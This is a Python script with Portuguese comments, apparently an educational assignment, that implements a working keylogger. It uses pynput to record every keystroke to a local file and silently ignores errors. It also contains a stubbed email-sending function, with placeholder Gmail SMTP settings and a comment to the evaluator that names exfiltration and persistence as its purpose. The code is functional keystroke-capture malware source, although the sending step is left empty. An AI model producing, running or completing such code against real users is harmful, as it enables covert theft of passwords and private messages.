from pynput import keyboard
import datetime

# Teclas que não queremos registrar para o log ficar limpo
IGNORAR = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock, keyboard.Key.cmd
}

# --- SIMULAÇÃO DE ENVIO POR E-MAIL (EDUCACIONAL) ---
def enviar_log_por_email():
    """
    Função para simular o envio do log capturado.
    Em um cenário real, usaríamos a biblioteca smtplib.
    """
    EMAIL_USUARIO = "seu-email@exemplo.com"
    SENHA_APP = "sua-senha-de-aplicativo"
    SERVIDOR_SMTP = "smtp.gmail.com" # Exemplo: Gmail
    PORTA_SMTP = 587
    
    # Comentário para o avaliador:
    # O envio seria implementado aqui para manter a persistência e exfiltração.
    pass

def on_press(key):
    try:
        conteudo = ""
        # Verifica se é tecla comum (letras, números, etc)
        if hasattr(key, 'char') and key.char is not None:
            conteudo = key.char
        else:
            # Tratamento de teclas de controle para legibilidade
            if key == keyboard.Key.space:
                conteudo = " "
            elif key == keyboard.Key.enter:
                conteudo = "\n"
            elif key == keyboard.Key.tab:
                conteudo = "\t"
            elif key == keyboard.Key.backspace:
                conteudo = "[BACKSPACE]"
            elif key in IGNORAR:
                return 
            else:
                conteudo = f" [{key}] "

        # Registro no arquivo local (Log)
        with open("keylog.txt", "a", encoding="utf-8") as f:
            f.write(conteudo)
            f.flush()

    except Exception as e:
        # Silencioso em produção, mas visível em desenvolvimento
        pass

def on_release(key):
    # Condição para parar o logger manualmente durante os testes
    if key == keyboard.Key.esc:
        print("\n[INFO] Encerrando captura de teclas...")
        return False

# --- INÍCIO DO PROGRAMA ---
if __name__ == "__main__":
    inicio = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("keylog.txt", "a", encoding="utf-8") as f:
        f.write(f"\n\n--- INÍCIO DA SESSÃO: {inicio} ---\n")

    print(f"[*] Monitorando teclado... (Pressione ESC para parar)")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
